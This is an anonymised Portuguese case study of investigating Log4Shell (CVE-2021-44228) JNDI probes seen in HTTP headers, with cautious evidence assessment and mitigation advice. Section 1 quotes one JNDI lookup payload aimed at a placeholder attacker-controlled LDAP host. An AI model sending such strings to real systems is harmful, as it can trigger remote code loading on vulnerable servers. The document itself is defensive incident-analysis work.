# Estudo de Caso 02 — Tentativa de exploração JNDI em requisições HTTP

**Tema:** JNDI / contexto da CVE-2021-44228 (Log4Shell)  
**Categoria:** Análise de tráfego HTTP e investigação de atividade suspeita  
**Natureza:** Estudo de caso profissional anonimizado e adaptado

## 1. Contexto

Durante o monitoramento de tráfego HTTP e atividades de Threat Hunting, foram identificadas requisições contendo padrões associados a tentativas de exploração JNDI em campos como `User-Agent` e `Referer`.

Um exemplo ilustrativo do padrão observado é:

```text
${jndi:ldap://<host-controlado-pelo-originador>}
```

O padrão é associado a tentativas de exploração de aplicações que utilizam versões vulneráveis do Apache Log4j 2, no contexto da CVE-2021-44228. A vulnerabilidade não afeta indiscriminadamente qualquer aplicação Java: é necessário avaliar a presença e a configuração das versões/componentes afetados, especialmente `log4j-core`.

## 2. Objetivo da análise

- Identificar e contextualizar requisições HTTP com payloads suspeitos.
- Correlacionar os eventos com alertas de segurança e fontes de inteligência.
- Avaliar o que as evidências permitem concluir.
- Recomendar medidas de investigação, contenção e mitigação.

## 3. Evidências descritas

- Requisições HTTP contendo strings JNDI em cabeçalhos como `User-Agent` e `Referer`.
- Alertas correlacionados denominados `Internal Suspected Malicious User Agent` e `Private to Private Exploit Anomaly`.
- Resposta HTTP `400` observada em uma das requisições.
- Endereços externos associados ao tráfego consultados em fontes públicas de reputação. Os indicadores específicos foram omitidos desta publicação.

## 4. Interpretação técnica

A presença de uma string JNDI em um cabeçalho é um indicador relevante de tentativa de exploração ou sondagem. Entretanto, a identificação do payload não comprova que a aplicação utilizava uma versão vulnerável do Log4j nem que houve execução de código.

A resposta HTTP `400` indica que a requisição recebeu uma resposta de erro do servidor ou de um componente intermediário. **Esse código, isoladamente, não comprova que um WAF bloqueou a tentativa, nem confirma ou descarta exploração bem-sucedida.** Para determinar o resultado, seria necessário correlacionar logs da aplicação, WAF, proxy, DNS e conexões de saída, além de verificar callbacks controlados ou outros indicadores de execução.

Também é necessário confirmar a versão efetivamente utilizada de `log4j-core`, inclusive dependências transitivas e componentes incorporados em produtos de terceiros.

## 5. Ações de investigação recomendadas

1. Identificar as aplicações e ativos que receberam as requisições.
2. Verificar inventário de dependências, versões do Log4j e presença de `log4j-core` afetado.
3. Correlacionar logs da aplicação, WAF, proxy reverso, DNS e firewall no mesmo intervalo temporal.
4. Verificar conexões de saída incomuns, especialmente tentativas de comunicação com serviços LDAP/RMI ou destinos associados à investigação.
5. Avaliar processos, arquivos temporários, tarefas agendadas, contas criadas recentemente e outros indicadores de comprometimento nos ativos relevantes.
6. Preservar logs, capturas de tráfego e evidências necessárias para investigação posterior.

## 6. Recomendações de contenção e mitigação

- Atualizar os componentes vulneráveis para versões corrigidas, seguindo a orientação oficial do fabricante.
- Aplicar regras de WAF para detectar e bloquear padrões maliciosos conhecidos, considerando variações de codificação e normalização.
- Restringir conexões de saída desnecessárias das aplicações.
- Isolar um ativo somente quando houver evidências suficientes de comprometimento ou risco imediato, ponderando a criticidade do serviço e o impacto operacional.
- Validar a cadeia de confiança de cabeçalhos como `X-Forwarded-For`; não tratar valores enviados diretamente pelo cliente como fonte confiável sem validação do proxy responsável.

## 7. Resultado e limites da conclusão

O material de origem descreve a identificação de padrões JNDI suspeitos e uma resposta HTTP `400`. Não apresenta evidência suficiente para afirmar execução remota de código, callback confirmado ou comprometimento do ativo.

A conclusão apropriada para o escopo publicado é **tentativa suspeita de exploração identificada, com resultado técnico não confirmado pelas evidências disponíveis**. A confirmação exigiria as verificações indicadas acima.

## 8. Competências demonstradas

- Análise de requisições e cabeçalhos HTTP.
- Reconhecimento de padrões JNDI relacionados à Log4Shell.
- Correlação de alertas e evidências.
- Threat Hunting e uso de OSINT.
- Avaliação de evidências e elaboração de recomendações de resposta.

## 9. Referências

- [NIST National Vulnerability Database — CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Apache Logging Services — Security](https://logging.apache.org/security.html)
- [Apache — informações de segurança sobre CVE-2021-44228](https://security.apache.org/blog/cve-2021-44228/)
- [CISA e parceiros — Mitigating Log4Shell and Other Log4j-Related Vulnerabilities](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a)
- [CISA — Joint CSA: Mitigating Log4Shell and Other Log4j-Related Vulnerabilities (PDF)](https://www.cisa.gov/sites/default/files/publications/AA21-356A_Joint_CSA_Mitigating_Log4Shell_and_Other_Log4j-Related_Vulnerabilities.pdf)

## Limitações

Payloads, IPs, domínios, nomes de ativos, logs e detalhes da infraestrutura foram removidos ou generalizados. A presença do payload não deve ser apresentada como prova de exploração bem-sucedida.
